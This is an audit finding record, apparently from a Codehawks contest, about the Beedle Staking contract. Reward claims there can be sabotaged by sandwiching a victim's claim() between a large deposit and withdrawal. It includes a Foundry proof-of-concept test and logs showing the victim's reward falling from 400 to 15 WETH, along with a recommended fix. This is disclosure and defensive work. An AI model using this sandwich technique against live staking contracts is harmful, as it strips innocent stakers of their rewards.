---
# Core Classification
protocol: Beedle - Oracle free perpetual lending
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 34503
audit_firm: Codehawks
contest_link: https://codehawks.cyfrin.io/c/clkbo1fa20009jr08nyyf9wbx
source_link: none
github_link: https://github.com/Cyfrin/2023-07-beedle

# Impact Classification
severity: high
impact: security_vulnerability
exploitability: 0.00
financial_impact: high

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 10
finders:
  - ABA
  - hasanza
  - pep7siup
  - KrisApostolov
  - BanditSecurity
---

## Vulnerability Title

Rewards can be sabotaged by large deposit and withdraw

### Overview


The report highlights a vulnerability in the Staking contract where rewards can be sabotaged by an attacker. This is done by making a large deposit or withdrawal sandwiched between a claim() function call. The attacker can then reduce the amount of reward tokens received by the victim without any cost to themselves. This can result in a loss of rewards for innocent stakers. The vulnerability was found using Foundry and the report recommends implementing a time delay between deposits and withdrawals to prevent this attack. 

### Original Finding Content

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L53-L58">https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Staking.sol#L53-L58</a>


## Summary

The rewards in the Staking contract are calculated based on the change in WETH and the amount of staked TKN at the exact time of withdrawal, regardless of how long the TKN has been staked. By sandwiching a claim() between a large deposit or withdraw, an attacker can reduce the amount of reward tokens a withdrawer gets. This attack costs them zero tokens, as in the TKN in == TKN out. They could profit from this if they already have a large amount of tokens staked, because these unrewarded tokens will get distributed to future claimants of rewards.

## Vulnerability Details

Here is a POC of the attack. There is a base case, where somebody deposits, then claims some ETH rewards.
The "attack case" is a replica of the base case, except the withdrawal transaction is sandwiched between the attacker's deposit and withdraw.
 

We use console.log() to log the amount claimed. In the base case, 400 WETH is claimed and in the attack case, the victim only claimed 15 WETH, so the attack successfully reduced the reward amount.

Since the attacker staked 10000 and immediately withdrew 10000, the attack cost them 0 TKN.

```solidity

contract StakingTest is Test {
    Staking staking;
    WETH9 weth;
    TKN tkn; 

    //users:
    //This contract is owner
    address attacker = address(1);
    address bob = address(2);
    address test_address = address(this);

    function setUp() public {
        weth = new WETH9();
        tkn = new TKN();
        staking = new Staking(address(tkn), address(weth));

        //get 1000WETH
        weth.deposit{value: 1000000}();
        weth.transfer(address(staking), 1000);

        tkn.transfer(attacker, 1000);
        tkn.transfer(bob, 1000);

    }

    function test_POC_sabotage_rewards_attack_case() public {
        
        console.log(weth.balanceOf(address(staking)), "initial weth balance");

        tkn.approve(address(staking), 1e30);
        staking.deposit(200);

        vm.startPrank(bob);
        tkn.approve(address(staking), 1000);
        staking.deposit(100);
        staking.deposit(100);
        vm.stopPrank();


        weth.transfer(address(staking), 800);
        
        staking.deposit(10000);

        vm.startPrank(bob);
        uint balance_before = weth.balanceOf(bob);
        staking.claim();
        uint balance_after = weth.balanceOf(bob);
        console.log(balance_after- balance_before, "claimed");
        vm.stopPrank();

        staking.withdraw(10000);
    }

    function test_POC_sabotage_rewards_base_case() public {
        
        console.log(weth.balanceOf(address(staking)), "initial weth balance");

        tkn.approve(address(staking), 1e30);
        staking.deposit(200);

        vm.startPrank(bob);
        tkn.approve(address(staking), 1000);
        staking.deposit(100);
        staking.deposit(100);
        vm.stopPrank();


        weth.transfer(address(staking), 800);
        

        vm.startPrank(bob);
        uint balance_before = weth.balanceOf(bob);
        staking.claim();
        uint balance_after = weth.balanceOf(bob);
        console.log(balance_after- balance_before, "claimed");
        vm.stopPrank();

    }
}
```

```
[PASS] test_POC_sabotage_rewards_attack_case() (gas: 359582)
Logs:
  1000 initial weth balance
  15 claimed

[PASS] test_POC_sabotage_rewards_base_case() (gas: 319598)
Logs:
  1000 initial weth balance
  400 claimed
```


## Impact

Innocent stakers can have their rewards slashed/sabotaged by flash deposit/withdraws

## Tools Used

Foundry

## Recommendations

Give a time delay between deposits and withdrawals.

### Metadata

| Field | Value |
|-------|-------|
| Impact | HIGH |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Codehawks |
| Protocol | Beedle - Oracle free perpetual lending |
| Report Date | N/A |
| Finders | ABA, hasanza, pep7siup, KrisApostolov, BanditSecurity, ptsanev, 0x3b, ubermensch, 0xanmol |

### Source Links

- **Source**: N/A
- **GitHub**: https://github.com/Cyfrin/2023-07-beedle
- **Contest**: https://codehawks.cyfrin.io/c/clkbo1fa20009jr08nyyf9wbx

### Keywords for Search

`vulnerability`

